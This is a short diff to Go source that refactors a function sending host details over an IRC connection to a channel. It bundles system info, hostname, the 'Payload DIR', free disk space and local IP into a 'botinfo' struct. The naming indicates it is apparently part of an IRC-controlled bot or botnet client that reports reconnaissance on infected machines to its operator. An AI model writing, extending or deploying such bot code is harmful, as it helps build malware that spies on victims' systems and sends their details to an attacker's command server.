@@ -9,6 +9,10 @@ import (
 	"golang.org/x/sys/unix"
 )
 
+type botinfo struct {
+	sys, hn, pd, fds, lip string
+}
+
 func freeDiskSpace(hw string) uint64 {
 	var stat unix.Statfs_t
 	unix.Statfs(hw, &stat)
@@ -36,12 +40,17 @@ func ReportInf(reportIRC net.Conn, set_chan string) {
 	pDir, _ := os.Getwd()
 
 	hw := &pDir
-	sFds := fmt.Sprint(freeDiskSpace(*hw))
-	sGlp := fmt.Sprint(getLocalIP())
+	nbotinfo := botinfo{
+		sys: sysInfo(),
+		hn:  hName,
+		pd:  pDir,
+		fds: fmt.Sprint(freeDiskSpace(*hw)),
+		lip: fmt.Sprint(getLocalIP()),
+	}
 
-	IRC_Report(reportIRC, set_chan, "System Info: "+sysInfo())
-	IRC_Report(reportIRC, set_chan, "Host Name: "+hName)
-	IRC_Report(reportIRC, set_chan, "Payload DIR: "+pDir)
-	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+sFds)
-	IRC_Report(reportIRC, set_chan, "Local IP: "+sGlp)
+	IRC_Report(reportIRC, set_chan, "System Info: "+nbotinfo.sys)
+	IRC_Report(reportIRC, set_chan, "Host Name: "+nbotinfo.hn)
+	IRC_Report(reportIRC, set_chan, "Payload DIR: "+nbotinfo.pd)
+	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+nbotinfo.fds)
+	IRC_Report(reportIRC, set_chan, "Local IP: "+nbotinfo.lip)
 }
